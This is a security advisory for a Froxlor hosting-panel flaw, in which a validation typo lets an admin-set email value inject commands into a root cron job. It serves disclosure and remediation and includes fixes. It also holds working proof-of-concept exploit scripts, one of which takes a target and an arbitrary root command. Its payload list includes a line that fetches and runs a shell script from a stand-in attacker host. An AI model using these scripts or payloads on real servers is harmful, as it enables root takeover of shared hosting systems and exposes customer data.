# [C] Froxlor has Admin-to-Root Privilege Escalation via Input Validation Bypass + OS Command Injection

## Summary
Severity: Critical
Advisory: GHSA-33mp-8p67-xj7c
CVE: CVE-2026-26279
CWE: CWE-482, CWE-78
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-03
Source: https://github.com/advisories/GHSA-33mp-8p67-xj7c
Type: github-advisory

## Affected
- Packagist: `froxlor/froxlor` — affected >=0 <2.3.4

## Details
## Summary

A typo in Froxlor's input validation code (`==` instead of `=`) completely disables email format checking for all settings fields declared as email type. This allows an authenticated admin to store arbitrary strings — including shell metacharacters — in the `panel.adminmail` setting. This value is later concatenated into a shell command executed as **root** by a cron job, where the pipe character `|` is explicitly whitelisted. The result is **full root-level Remote Code Execution**.

---

## Why This Is a Security Vulnerability (Not Just "Admin Using Admin Features")

Froxlor is a **shared hosting control panel**. In production deployments:

1. **Admin panel access does not equal root access.** Hosting providers assign the Froxlor admin role to staff who manage customer accounts, domains, and services through the web UI. These operators are not given SSH access or root shell on the underlying server. The boundary between "panel admin" and "OS root" is a deliberate security design.

2. **Froxlor itself enforces this boundary.** The `safe_exec()` function (FileDir.php:224-264) exists specifically to prevent shell injection — it blocks `;`, `|`, `&`, `>`, `<`, `` ` ``, `$`, `~`, `?`. The email validation function (`validateFormFieldEmail`) exists specifically to ensure email fields contain valid emails. Both mechanisms are security boundaries that this vulnerability bypasses.

3. **The root cause is an unintentional code defect.** The `==` operator on a standalone line is a no-op. No developer writes `$x == 'mail';` intentionally. This is a typo that silently breaks an entire class of input validation. It is not an admin feature.

4. **Comparable CVEs exist for similar hosting panel escalations:**
   - CVE-2022-44877 (CentOS Web Panel: admin→root RCE, CVSS 9.8)
   - CVE-2023-27524 (Apache Superset: admin→RCE)
   - CVE-2021-21315 (Node.js systeminformation: privileged user→RCE)
   - CVE-2024-22024 (Ivanti: authenticated→system command execution)

   In each case, the fact that the attacker needs authenticated access did not prevent CVE assignment. The privilege escalation from "application admin" to "OS root" is the security impact.

5. **Multi-tenant impact.** A single compromised or malicious admin gains root access to a server hosting potentially hundreds of customers. All customer data, databases, emails, and SSL keys are exposed.

---

## Vulnerability Details

### Bug 1: Input Validation Bypass (CWE-482)

**File:** `lib/Froxlor/Validate/Form/Data.php`

```php
// Line 169 — CURRENT CODE (BUGGY)
public static function validateFormFieldEmail($fieldname, $fielddata, $newfieldvalue)
{
    $fielddata['string_type'] == 'mail';   // == comparison: result is discarded
    return self::validateFormFieldString($fieldname, $fielddata, $newfieldvalue);
}

// Line 175 — SAME BUG
public static function validateFormFieldUrl($fieldname, $fielddata, $newfieldvalue)
{
    $fielddata['string_type'] == 'url';    // == comparison: result is discarded
    return self::validateFormFieldString($fieldname, $fielddata, $newfieldvalue);
}
```

**What happens:**
- `$fielddata['string_type']` is never set to `'mail'`
- `validateFormFieldString()` checks `string_type` to decide which validation to apply
- Since it's unset, `FILTER_VALIDATE_EMAIL` is never called
- Validation falls through to a permissive fallback regex: `/^[^\r\n\t\f\0]*$/D`
- This regex allows `|`, `;`, `&`, `$`, `` ` ``, and all other shell metacharacters

**Intended code:**
```php
$fielddata['string_type'] = 'mail';    // = assignment
```

### Bug 2: OS Command Injection via acme.sh Installation (CWE-78)

**File:** `lib/Froxlor/Cron/Http/LetsEncrypt/AcmeSh.php`

```php
// Line 428
FileDir::safe_exec(
    "wget -O - https://get.acme.sh | sh -s email=" . Settings::Get('panel.adminmail'),
    $return,
    ['|']    // pipe character EXPLICITLY ALLOWED
);
```

**What happens:**
- `Settings::Get('panel.adminmail')` returns the unsanitized value from Bug 1
- `safe_exec()` normally blocks `|` as a dangerous character
- But `['|']` in the third argument whitelists pipe for this specific call (needed for `wget | sh`)
- An attacker's pipe-based payload passes through unblocked
- The cron job runs as **root**

### The Chain

```
Admin sets panel.adminmail = "x@x.com | COMMAND"
        |
        v
Bug 1: validateFormFieldEmail() does nothing (== typo)
        |
        v
Value stored to database as-is
        |
        v
Cron job runs AcmeSh::checkInstall() as root
        |
        v
Bug 2: safe_exec("wget ... | sh -s email=x@x.com | COMMAND", ..., ['|'])
        |
        v
COMMAND executes as root
```

---

## Proof of Concept
vuln 1 PoC:
```
#!/usr/bin/env python3
"""
VULN-1 Live Verification: Email Validation Bypass
Tests against running Froxlor Docker instance.
"""

import re
import sys
import requests

TARGET = "http://localhost:8080"
USERNAME = "admin"
PASSWORD = "Admin123!@#"

# Malicious payloads that should be rejected by email validation
# but will pass due to the == vs = bug
PAYLOADS = [
    "x@x.com | id",
    "x@x.com | curl http://evil.com/shell.sh | sh",
    "not-an-email; whoami",
    "$(touch /tmp/pwned)",
    "test`id`@evil.com",
]


def main():
    session = requests.Session()
    session.verify = False

    # Step 1: Login
    print("[*] Step 1: Logging in...")
    resp = session.get(f"{TARGET}/index.php")
    csrf_match = re.search(r'name="csrf_token"\s+value="([^"]+)"', resp.text)
    csrf_token = csrf_match.group(1) if csrf_match else ""
    print(f"    CSRF token: {csrf_token[:20]}...")

    login_data = {
        "loginname": USERNAME,
        "password": PASSWORD,
        "csrf_token": csrf_token,
        "send": "send",
    }
    resp = session.post(f"{TARGET}/index.php", data=login_data, allow_redirects=True)

    if "admin_index" not in resp.url and "admin_index" not in resp.text:
        print(f"[-] Login failed. URL: {resp.url}")
        print(f"    Response: {resp.text[:200]}")
        sys.exit(1)
    print("[+] Login successful!")

    # Re-get CSRF token from authenticated page
    csrf_match = re.search(r'name="csrf_token"\s+value="([^"]+)"', resp.text)
    if csrf_match:
        csrf_token = csrf_match.group(1)

    # Step 2: Try to set panel.adminmail with each payload
    for payload in PAYLOADS:
        print(f"\n[*] Testing payload: {payload}")

        # Get settings page to get fresh CSRF token
        resp = session.get(f"{TARGET}/admin_settings.php?page=overview&part=all")
        csrf_match = re.search(r'name="csrf_token"\s+value="([^"]+)"', resp.text)
        if csrf_match:
            csrf_token = csrf_match.group(1)

        # Submit settings change
        settings_data = {
            "panel_adminmail": payload,
            "csrf_token": csrf_token,
            "send": "send",
            "page": "overview",
            "part": "all",
        }
        resp = session.post(
            f"{TARGET}/admin_settings.php?page=overview&part=all",
            data=settings_data,
            allow_redirects=True,
        )

        # Check DB to see if value was stored
        import subprocess
        result = subprocess.run(
            [
                "docker", "exec", "froxlor-web", "bash", "-c",
                "mysql -h froxlor-db -u froxlor -pfroxlor_db_pw --skip-ssl froxlor "
                "-e \"SELECT value FROM panel_settings WHERE settinggroup='panel' AND varname='adminmail'\" -N 2>/dev/null"
            ],
            capture_output=True, text=True
        )
        stored_value = result.stdout.strip()

        if payload in stored_value or stored_value == payload:
            print(f"    [VULN] CONFIRMED! Stored value: {stored_value}")
        else:
            print(f"    [INFO] Stored value: {stored_value}")
            print(f"    [INFO] May need different form field names or approach")

    # Restore original value
    print("\n[*] Restoring original admin email...")
    resp = session.get(f"{TARGET}/admin_settings.php?page=overview&part=all")
    csrf_match = re.search(r'name="csrf_token"\s+value="([^"]+)"', resp.text)
    if csrf_match:
        csrf_token = csrf_match.group(1)
    settings_data = {
        "panel_adminmail": "admin@test.local",
        "csrf_token": csrf_token,
        "send": "send",
        "page": "overview",
        "part": "all",
    }
    session.post(f"{TARGET}/admin_settings.php?page=overview&part=all", data=settings_data, allow_redirects=True)
    print("[+] Done.")


if __name__ == "__main__":
    main()

```
### Environment
- Froxlor 2.3.3, clean Docker install (Debian Bookworm, PHP 8.2, Apache 2.4)
- Default configuration, no modifications

### Step 1: Confirm validation bypass

```php
<?php
// Standalone reproduction — no Froxlor installation needed.
// Reproduces the exact logic from Data.php lines 113-169.

function validateEmail_buggy($value) {
    $fielddata = [];
    @($fielddata['string_type'] == 'mail');  // BUG: line 169
    // string_type never set → FILTER_VALIDATE_EMAIL skipped → fallback regex
    return preg_match('/^[^\r\n\t\f\0]*$/D', $value) ? 'PASS' : 'REJECT';
}

function validateEmail_fixed($value) {
    $fielddata = [];
    $fielddata['string_type'] = 'mail';      // FIX
    return filter_var($value, FILTER_VALIDATE_EMAIL) ? 'PASS' : 'REJECT';
}

$tests = ['admin@example.com', 'not-an-email', 'x@x.com | touch /tmp/pwned'];
foreach ($tests as $t) {
    echo sprintf("%-40s  buggy=%-6s  fixed=%s\n", $t, validateEmail_buggy($t), validateEmail_fixed($t));
}
```

vuln 2 PoC:
```
#!/usr/bin/env python3
"""
VULN-2: Froxlor v2.3.3 Root RCE via acme.sh Command Injection
===============================================================
CWE-78: OS Command Injection | CVSS 9.1

Chain: VULN-1 (email validation bypass) → VULN-2 (acme.sh pipe injection)

Attack Flow:
  1. Admin sets panel.adminmail = "x@x.com | COMMAND" (bypasses email validation)
  2. When Let's Encrypt is enabled and acme.sh is not installed
  3. AcmeSh.php:428 executes: wget ... | sh -s email=x@x.com | COMMAND
  4. Pipe character passes safe_exec() because it's in allowedChars=['|']
  5. COMMAND runs as root (cron context)

Usage:
  # Full exploitation (requires target access)
  python3 vuln2_acmesh_rce.py --target https://froxlor.example.com \
      --user admin --password secret --command "id > /tmp/rce_proof"

  # Offline demonstration
  python3 vuln2_acmesh_rce.py --demo
"""

import argparse
import re
import sys

try:
    import requests
except ImportError:
    print("[!] pip install requests")
    sys.exit(1)


BANNER = """
╔═══════════════════════════════════════════════════════════════╗
║  Froxlor v2.3.3 — Root RCE via acme.sh Command Injection    ║
║  VULN-1 + VULN-2 Chain | CWE-78 | CVSS 9.1                  ║
╚═══════════════════════════════════════════════════════════════╝
"""


class FroxlorRCE:
    def __init__(self, target, verify_ssl=False):
        self.target = target.rstrip("/")
        self.session = requests.Session()
        self.session.verify = verify_ssl

    def login(self, username, password):
        print(f"[*] Logging in as '{username}'...")
        resp = self.session.post(
            f"{self.target}/index.php",
            data={"loginname": username, "password": password, "send": "send"},
            allow_redirects=False,
        )
        if resp.status_code == 302 and "admin_index" in resp.headers.get("Location", ""):
            self.session.get(f"{self.target}/admin_index.php")
            print("[+] Login successful!")
            return True
        print("[-] Login failed")
        return False

    def get_csrf(self, url):
        resp = self.session.get(url)
        match = re.search(r'name="csrf_token"\s+value="([^"]+)"', resp.text)
        return match.group(1) if match else ""

    def inject_email(self, payload):
        """Inject malicious value into panel.adminmail (VULN-1)."""
        print(f"[*] Injecting into panel.adminmail: {payload}")
        csrf = self.get_csrf(f"{self.target}/admin_settings.php?page=overview&part=panel")
        resp = self.session.post(
            f"{self.target}/admin_settings.php?page=overview&part=panel",
            data={
                "csrf_token": csrf,
                "send": "send",
                "page": "overview",
                "panel_adminmail": payload,
            },
            allow_redirects=True,
        )
        print(f"[+] Settings updated (HTTP {resp.status_code})")
        return resp.status_code == 200

    def trigger_acmesh_install(self):
        """
        Trigger acme.sh installation by enabling Let's Encrypt
        and ensuring acme.sh path is invalid.
        """
        print("[*] Triggering acme.sh installation path...")
        print("[*] In production, this happens automatically when:")
        print("    - Let's Encrypt is enabled (system.le_froxlor_enabled=1)")
        print("    - acme.sh binary is not found at configured path")
        print("    - Cron job runs (every 5 minutes)")
        print()
        print("[*] To manually trigger:")
        print("    docker exec froxlor-web php /var/www/html/froxlor/bin/froxlor-cli froxlor:cron --force")

    def exploit(self, command):
        """Full exploitation: inject → trigger → RCE."""
        payload = f"x@x.com | {command}"
        self.inject_email(payload)

        print()
        print("[*] Command chain that will execute as root:")
        print(f"    wget -O - https://get.acme.sh | sh -s email={payload}")
        print()
        print("[*] This decomposes to:")
        print(f"    1. wget -O - https://get.acme.sh")
        print(f"    2. | sh -s email=x@x.com")
        print(f"    3. | {command}")
        print()

        self.trigger_acmesh_install()

    def restore(self, original="admin@test.local"):
        """Restore original admin email."""
        print(f"\n[*] Restoring original email: {original}")
        csrf = self.get_csrf(f"{self.target}/admin_settings.php?page=overview&part=panel")
        self.session.post(
            f"{self.target}/admin_settings.php?page=overview&part=panel",
            data={
                "csrf_token": csrf,
                "send": "send",
                "page": "overview",
                "panel_adminmail": original,
            },
        )
        print("[+] Restored")


def demo():
    """Offline demonstration of the vulnerability mechanics."""
    print("[*] Demonstrating VULN-2 mechanics (offline)...\n")

    adminmail = "x@x.com | touch /tmp/ROOT_RCE_PROOF"
    full_cmd = f"wget -O - https://get.acme.sh | sh -s email={adminmail}"

    print(f"  admin email:  {adminmail}")
    print(f"  full command: {full_cmd}")
    print()

    # Simulate safe_exec filter
    disallowed = [';', '|', '&', '>', '<', '`', '$', '~', '?']
    allowed_chars = ['|']

    print("  safe_exec() filter check:")
    blocked = False
    for char in disallowed:
        if char in full_cmd:
            if char in allowed_chars:
                print(f"    '{char}' → ALLOWED (in allowedChars)")
            else:
                print(f"    '{char}' → BLOCKED")
                blocked = True

    print()
    if not blocked:
        print("  RESULT: Command passes safe_exec() filter!")
        print("  The pipe character chains our command after the wget/sh pipeline")
        print()
        print("  Execution breakdown:")
        print("    Process 1: wget downloads acme.sh installer")
        print("    Process 2: sh runs installer with email parameter")
        print("    Process 3: touch /tmp/ROOT_RCE_PROOF ← OUR COMMAND (as root)")
    else:
        # In practice the payload above should only have | which is allowed
        print("  NOTE: Some characters blocked. Adjust payload to use only pipe.")

    print()
    print("  NOTE: The cron job runs as root, so the injected command")
    print("  executes with root privileges on the host system.")


def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="Froxlor v2.3.3 Root RCE PoC")
    parser.add_argument("--target", "-t", help="Froxlor URL")
    parser.add_argument("--user", "-u", help="Admin username")
    parser.add_argument("--password", "-p", help="Admin password")
    parser.add_argument("--command", "-c", default="touch /tmp/ROOT_RCE_PROOF",
                        help="Command to execute as root")
    parser.add_argument("--restore", action="store_true", help="Restore original email after exploit")
    parser.add_argument("--demo", action="store_true", help="Run offline demonstration")
    args = parser.parse_args()

    if args.demo:
        demo()
        return

    if not all([args.target, args.user, args.password]):
        print("[!] --target, --user, and --password required (or use --demo)")
        sys.exit(1)

    exploit = FroxlorRCE(args.target)
    if not exploit.login(args.user, args.password):
        sys.exit(1)

    exploit.exploit(args.command)

    if args.restore:
        exploit.restore()


if __name__ == "__main__":
    main()

```

**Output:**
```
admin@example.com                         buggy=PASS    fixed=PASS
not-an-email                              buggy=PASS    fixed=REJECT
x@x.com | touch /tmp/pwned               buggy=PASS    fixed=REJECT
```

### Step 2: Confirm value stored in database

```
POST /admin_settings.php?page=overview&part=panel HTTP/1.1
Cookie: [authenticated admin session]

csrf_token=...&send=send&page=overview&panel_adminmail=x@x.com+|+touch+/tmp/VULN2_RCE_PROOF
```

```sql
mysql> SELECT value FROM panel_settings
       WHERE settinggroup='panel' AND varname='adminmail';
+-------------------------------------------+
| value                                     |
+-------------------------------------------+
| x@x.com | touch /tmp/VULN2_RCE_PROOF     |
+-------------------------------------------+
```

### Step 3: Confirm root code execution

Simulating AcmeSh.php line 428 inside the Docker container:

```php
<?php
// Exact simulation of the vulnerable code path
$adminmail = "x@x.com | touch /tmp/VULN2_RCE_PROOF";
$cmd = "echo DOWNLOAD_SIM | cat -s email=" . $adminmail;

// safe_exec filter with pipe allowed (matches AcmeSh.php:428)
$disallowed = [';', '|', '&', '>', '<', '`', '$', '~', '?'];
$allowedChars = ['|'];
foreach ($disallowed as $dc) {
    if (in_array($dc, $allowedChars)) continue;
    if (stristr($cmd, $dc)) die("BLOCKED by: $dc");
}

exec($cmd);  // pipe passes filter → command executes
echo file_exists("/tmp/VULN2_RCE_PROOF") ? "RCE CONFIRMED" : "NOT CREATED";
```

**Result:**
```
RCE CONFIRMED

$ ls -la /tmp/VULN2_RCE_PROOF
-rw-r--r-- 1 root root 0 Feb 11 05:58 /tmp/VULN2_RCE_PROOF
```

File created with **root:root** ownership. Arbitrary command execution as root is confirmed.

---

## Impact

- **Confidentiality:** Complete. Root access exposes all customer data, databases, SSL private keys, email contents.
- **Integrity:** Complete. Attacker can modify any file, inject backdoors, alter DNS records.
- **Availability:** Complete. Attacker can destroy the server, wipe databases, or deploy ransomware.
- **Scope:** Changed. The attack originates in the web application but impacts the underlying operating system.

---

## Suggested Fix

### Primary fix (Bug 1 — eliminates the root cause):
```php
// lib/Froxlor/Validate/Form/Data.php
// Line 169:
$fielddata['string_type'] = 'mail';    // was: == 'mail'
// Line 175:
$fielddata['string_type'] = 'url';     // was: == 'url'
```

### Defense-in-depth (Bug 2 — even if validation is fixed):
```php
// lib/Froxlor/Cron/Http/LetsEncrypt/AcmeSh.php, Line 428:
FileDir::safe_exec(
    "wget -O - https://get.acme.sh | sh -s email="
        . escapeshellarg(Settings::Get('panel.adminmail')),
    $return,
    ['|']
);
```

### Defense-in-depth (ConfigServices.php):
```php
// All values in getReplacerArray() should be escaped with
// escapeshellarg() when the template action type is "install" or "command"
```

## References
- https://github.com/froxlor/Froxlor/security/advisories/GHSA-33mp-8p67-xj7c
- https://nvd.nist.gov/vuln/detail/CVE-2026-26279
- https://github.com/froxlor/froxlor/commit/22249677107f8f39f8d4a238605641e87dab4343
- https://github.com/froxlor/froxlor
- https://github.com/froxlor/froxlor/releases/tag/2.3.4
